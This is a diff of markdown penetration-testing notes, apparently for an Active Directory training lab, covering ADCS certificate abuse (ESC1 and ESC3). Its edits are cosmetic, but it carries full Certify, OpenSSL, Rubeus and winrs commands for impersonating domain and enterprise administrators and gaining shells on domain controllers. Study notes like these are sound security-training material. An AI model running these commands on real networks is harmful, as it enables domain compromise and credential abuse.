@@ -648,28 +648,30 @@ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 
 ---
 
+## Active Directory Certificate Services (ADCS) Abuse
+
 ### ESC1 - Enterprise Admin (Cross Domain)
 
 **Tool:** Certify → OpenSSL → Rubeus
 
 **Precondition:** Same ESC1 but targeting EA across domain
 
-**Step 1 — Request certificate as EA:**
+**Step 1 - Request certificate as EA:**
 ```powershell
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
 ```
 
-**Step 2 — Convert PEM to PFX:**
+**Step 2 - Convert PEM to PFX:**
 ```powershell
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
 ```
 
-**Step 3 — Request TGT using certificate:**
+**Step 3 - Request TGT using certificate:**
 ```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
 ```
 
-**Step 4 — Verify access:**
+**Step 4 - Verify access:**
 ```powershell
 winrs -r:mcorp-dc cmd /c set username
 ```
@@ -686,9 +688,9 @@ winrs -r:mcorp-dc cmd /c set username
 | `/sid` | SID of the account to impersonate |
 | `/certificate` | Path to PFX certificate file |
 | `/password` | Password set during PFX export |
-| `/ptt` | Pass the ticket — inject into current session |
+| `/ptt` | Pass the ticket - inject into current session |
 
-## ADCS - ESC3 - Enrollment Agent Abuse
+### ESC3 - Enrollment Agent Abuse
 
 ### How ESC3 Works
 ```
@@ -713,35 +715,35 @@ C:\AD\Tools\Certify.exe find
 ### ESC3 - Domain Admin
 
 **Precondition:** Two vulnerable templates exist:
-- `SmartCardEnrollment-Agent` — allows enrollment agent
-- `SmartCardEnrollment-Users` — allows enroll on behalf of
+- `SmartCardEnrollment-Agent` - allows enrollment agent
+- `SmartCardEnrollment-Users` - allows enroll on behalf of
 
-**Step 1 — Request Enrollment Agent certificate:**
+**Step 1 - Request Enrollment Agent certificate:**
 ```powershell
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
 ```
 
-**Step 2 — Convert agent PEM to PFX:**
+**Step 2 - Convert agent PEM to PFX:**
 ```powershell
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
 ```
 
-**Step 3 — Request cert on behalf of DA using agent cert:**
+**Step 3 - Request cert on behalf of DA using agent cert:**
 ```powershell
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
 ```
 
-**Step 4 — Convert DA PEM to PFX:**
+**Step 4 - Convert DA PEM to PFX:**
 ```powershell
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
 ```
 
-**Step 5 — Request TGT as DA:**
+**Step 5 - Request TGT as DA:**
 ```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
 ```
 
-**Step 6 — Verify access:**
+**Step 6 - Verify access:**
 ```powershell
 winrs -r:dcorp-dc cmd
 ```
@@ -752,32 +754,32 @@ winrs -r:dcorp-dc cmd
 
 **Change:** Use `/onbehalfof:mcorp\administrator` instead of `dcorp\administrator`
 
-**Step 1 — Request Enrollment Agent certificate:**
+**Step 1 - Request Enrollment Agent certificate:**
 ```powershell
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
 ```
 
-**Step 2 — Convert agent PEM to PFX:**
+**Step 2 - Convert agent PEM to PFX:**
 ```powershell
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
 ```
 
-**Step 3 — Request cert on behalf of EA:**
+**Step 3 - Request cert on behalf of EA:**
 ```powershell
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
 ```
 
-**Step 4 — Convert EA PEM to PFX:**
+**Step 4 - Convert EA PEM to PFX:**
 ```powershell
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
 ```
 
-**Step 5 — Request TGT as EA:**
+**Step 5 - Request TGT as EA:**
 ```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-EA.pfx /password:SecretPass@123 /ptt
 ```
 
-**Step 6 — Verify access:**
+**Step 6 - Verify access:**
 ```powershell
 winrs -r:mcorp-dc cmd
 ```
